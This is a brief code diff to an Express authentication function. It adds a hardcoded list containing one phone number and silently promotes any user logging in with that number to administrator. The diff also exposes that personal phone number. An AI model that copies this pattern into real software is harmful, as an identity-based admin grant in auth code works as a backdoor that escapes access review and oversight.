@@ -240,6 +240,11 @@ export async function setupAuth(app: Express) {
         }).returning();
       }
 
+      const ADMIN_PHONES = ["+919102557680"];
+      if (ADMIN_PHONES.includes(phone) && !user.isAdmin) {
+        [user] = await db.update(users).set({ isAdmin: true }).where(eq(users.id, user.id)).returning();
+      }
+
       (req.session as any).userId = user.id;
       (req.session as any).phone = phone;
 
